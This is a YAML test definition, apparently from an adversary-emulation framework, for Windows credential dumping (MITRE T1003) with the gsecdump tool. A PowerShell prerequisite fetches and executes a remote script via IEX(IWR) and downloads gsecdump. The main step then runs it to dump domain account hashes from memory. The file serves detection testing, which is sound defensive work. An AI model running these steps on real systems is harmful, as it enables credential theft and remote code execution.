api_version: "2.0"
name: Gsecdump
description: "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n"
args:
    - name: gsecdump_url
      type: string
      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
    - name: gsecdump_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe
    - name: gsecdump_bin_hash
      type: string
      default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
uuid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Gsecdump must exist on disk at specified location (#{gsecdump_exe})
      inline: |
        if (Test-Path "#{gsecdump_exe}") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
        if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
          Move-Item $binpath "#{gsecdump_exe}"
        }
        }}
      executor: powershell
    - name: gsecdump
      inline: |
        "{{.Args.gsecdump_exe}}" -a
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
